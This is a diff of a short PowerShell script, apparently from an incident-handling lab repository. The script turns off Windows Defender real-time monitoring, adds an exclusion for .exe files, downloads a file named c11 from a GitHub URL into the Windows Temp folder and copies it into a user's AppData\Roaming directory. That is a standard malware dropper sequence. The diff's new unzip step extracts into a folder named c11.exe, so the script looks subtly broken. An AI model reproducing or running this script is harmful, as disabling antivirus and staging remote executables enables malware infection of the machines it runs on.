@@ -1,10 +1,12 @@
 Set-MpPreference -ExclusionExtension ".exe"
 Set-MpPreference -DisableRealtimeMonitoring $true
 
-$url = "https://github.com/jovair1994/Incident_Handling_Deploy/raw/main/c11.exe"
-$d = "C:\Windows\Temp\c11.exe"
+$url = "https://github.com/jovair1994/Incident_Handling_Deploy/raw/main/c11.zip"
+$d = "C:\Windows\Temp\c11.zip"
 
 Invoke-WebRequest -Uri $url -OutFile $d
+
+Expand-Archive -Path "C:\Windows\Temp\c11.zip" -DestinationPath "C:\Windows\Temp\c11.exe"
 
 copy "C:\Windows\Temp\c11.exe" "C:\Users\hardening\AppData\Roaming\"
 
